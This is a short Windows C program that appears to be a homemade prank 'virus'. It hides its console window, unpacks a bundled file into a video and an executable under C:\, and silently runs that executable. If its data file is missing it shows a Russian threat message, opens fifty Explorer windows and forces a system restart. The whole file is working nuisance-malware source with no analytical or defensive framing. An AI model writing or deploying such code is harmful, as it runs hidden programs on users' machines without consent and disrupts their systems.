#include <stdio.h>
#include <conio.h>
#include <Windows.h>
int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	FILE *fBin, *fExe, *fAvi;
	short ex;
	fBin=fopen("Parts.bin", "rb");
	fExe=fopen("C:\\runVideo.exe", "wb");
	fAvi=fopen("C:\\1.avi", "wb");
	if(!fBin) 
	{
		MessageBox(NULL, L"Ты удалил мой файл... \nТы за это поплатишся!", L"Virus.exe", MB_OK | MB_ICONINFORMATION);
		for(int i=0; i<50; i++)
			system("start explorer");
		system("shutdown /r /t 100");
		return 0;
	}
	for(int i=0; i<9964571; i++)
	{
		fread(&ex, 2, 1, fBin);
		fwrite(&ex, 2, 1, fAvi);
	}
	for(int i=0; i<3584; i++)
	{
		fread(&ex, 2, 1, fBin);
		fwrite(&ex, 2, 1, fExe);
	}
	fclose(fExe);
	fclose(fAvi);
	fclose(fBin);
	system("start C:\\runVideo.exe");	
}